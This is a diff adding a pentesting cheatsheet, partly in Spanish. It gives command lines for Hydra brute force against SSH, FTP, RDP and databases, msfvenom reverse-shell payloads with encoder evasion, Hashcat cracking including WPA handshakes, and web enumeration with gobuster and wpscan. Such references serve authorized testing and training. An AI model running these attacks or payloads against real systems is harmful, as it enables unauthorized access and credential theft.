@@ -209,6 +209,197 @@ nmap -sT -p 443 192.168.1.1
 ```
 
 
+# Hydra Cheatsheet
+
+## Brute Force SSH Login
+```bash
+hydra -l user -P passwords.txt ssh://192.168.1.1
+```
+
+## Brute Force FTP Login
+```bash
+hydra -l user -P passwords.txt ftp://192.168.1.1
+```
+
+## Brute Force HTTP Basic Authentication
+```bash
+hydra -l admin -P passwords.txt 192.168.1.1 http-get /admin
+```
+
+## Brute Force HTTP Form Authentication
+```bash
+hydra -l admin -P passwords.txt 192.168.1.1 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
+```
+
+## Brute Force MySQL Login
+```bash
+hydra -l root -P passwords.txt mysql://192.168.1.1
+```
+
+## Brute Force PostgreSQL Login
+```bash
+hydra -l postgres -P passwords.txt postgres://192.168.1.1
+```
+
+## Brute Force RDP Login
+```bash
+hydra -l Administrator -P passwords.txt rdp://192.168.1.1
+```
+
+# Msfvenom Cheatsheet
+
+## Generar un Payload para Windows
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<tu_IP> LPORT=<puerto> -f exe > shell.exe
+```
+
+## Generar un Payload para Linux
+```bash
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<tu_IP> LPORT=<puerto> -f elf > shell.elf
+```
+
+## Generar un Payload para Android
+```bash
+msfvenom -p android/meterpreter/reverse_tcp LHOST=<tu_IP> LPORT=<puerto> -o shell.apk
+```
+
+## Generar Shellcode en Formato C
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=<tu_IP> LPORT=<puerto> -f c
+```
+
+## Obtener la Lista de Formatos Disponibles
+```bash
+msfvenom --list formats
+```
+
+## Ver la Lista de Payloads Disponibles
+```bash
+msfvenom --list payloads
+```
+
+## Codificar un Payload con Shikata Ga Nai
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<tu_IP> LPORT=<puerto> -e x86/shikata_ga_nai -i 5 -f exe > shell_encoded.exe
+```
+
+# Hashcat Cheatsheet
+
+## Dictionary Attack
+```bash
+hashcat -m <hash_mode> -a 0 <hash_file> <wordlist>
+```
+
+## Combination Attack
+```bash
+hashcat -m <hash_mode> -a 1 <hash_file> <wordlist1> <wordlist2>
+```
+
+## Mask Attack
+```bash
+hashcat -m <hash_mode> -a 3 <hash_file> ?a?a?a?a
+```
+
+## Hybrid Mode
+```bash
+hashcat -m <hash_mode> -a 6 <hash_file> <wordlist> ?a?a
+```
+
+## Creating Custom Wordlists
+```bash
+crunch 8 10 abcdefghijklmnopqrstuvwxyz -o wordlist.txt
+```
+
+## Working with Rules
+```bash
+hashcat -r rules/best64.rule -m <hash_mode> -a 0 <hash_file> <wordlist>
+```
+
+## Cracking Common Hashes
+```bash
+hashcat -m 0 -a 0 hash.txt rockyou.txt
+```
+
+## Cracking Miscellaneous Files & Hashes
+```bash
+hashcat -m 1000 -a 0 hash.txt wordlist.txt
+```
+
+## Cracking Wireless (WPA/WPA2) Handshakes with Hashcat
+```bash
+hashcat -m 2500 -a 0 handshake.hccapx wordlist.txt
+```
+
+# SSLScan Cheatsheet
+
+## Escanear un dominio en busca de protocolos SSL/TLS
+```bash
+sslscan <dominio>
+```
+
+## Escanear un puerto específico
+```bash
+sslscan --no-failed --port 443 <dominio>
+```
+
+# Hacking with Curl
+
+Recursos:
+- [GitHub: Hacking With Curl](https://github.com/frizb/HackingWithCurl)
+- [Artículo: Hacking with Curl](https://manasharsh.medium.com/hacking-with-curl-unleash-the-cli-beast-fdf13ec342cc)
+- [Cheatsheet: Curl](https://www.stationx.net/curl-cheat-sheet/)
+
+## Obtener encabezados HTTP de un sitio web
+```bash
+curl -I <url>
+```
+
+## Enviar una solicitud GET
+```bash
+curl -X GET <url>
+```
+
+## Enviar una solicitud POST con datos
+```bash
+curl -X POST -d "param1=value1&param2=value2" <url>
+```
+
+# Gobuster Cheatsheet
+
+## Enumerar directorios en un sitio web
+```bash
+gobuster dir -u <url> -w /usr/share/wordlists/dirb/common.txt
+```
+
+## Enumerar subdominios
+```bash
+gobuster dns -d <dominio> -w /usr/share/wordlists/subdomains.txt
+```
+
+# Dirsearch Cheatsheet
+
+## Escanear directorios en un sitio web
+```bash
+python3 dirsearch.py -u <url> -e php,html,txt
+```
+
+# Wpscan Cheatsheet
+
+## Escanear un sitio WordPress en busca de vulnerabilidades
+```bash
+wpscan --url <url> --enumerate vp
+```
+
+## Enumerar usuarios de WordPress
+```bash
+wpscan --url <url> --enumerate u
+```
+
+## Escanear plugins vulnerables
+```bash
+wpscan --url <url> --enumerate p
+```
+
 
 
 
